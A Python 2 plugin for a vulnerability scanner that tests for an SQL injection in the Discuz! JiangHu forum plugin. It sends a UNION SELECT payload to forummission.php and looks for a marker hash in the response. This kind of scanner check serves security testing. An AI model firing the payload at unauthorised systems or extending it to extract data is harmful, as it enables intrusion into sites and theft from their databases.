# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "Discuz! JiangHu Plugin SQL注入",
        "info": "Discuz! JiangHu Plugin 存在SQL注入漏洞",
        "level": "高危",
        "type": "SQL注入",
        "author": "taro",
        "url": "",
        "keyword": "all:discuz",
        "source": 1
    }
    return plugin_info

def check(host, port, timeout):
    url = "http://%s:%d" % (host, int(port))
    payload_url = "/forummission.php?index=show&id=24%20and+1=2+union+select+1,2,md5(700),4,5,6,7,8,9,10,11--"
    url_fin = url + payload_url
    try:
        res = requests.get(url_fin, timeout=timeout)
        if 'e5841df2166dd424a57127423d276bbe' in res.text:
            info = '存在SQL注入漏洞: %s' % payload_url
#            print info
            return info
    except Exception, e:
        pass
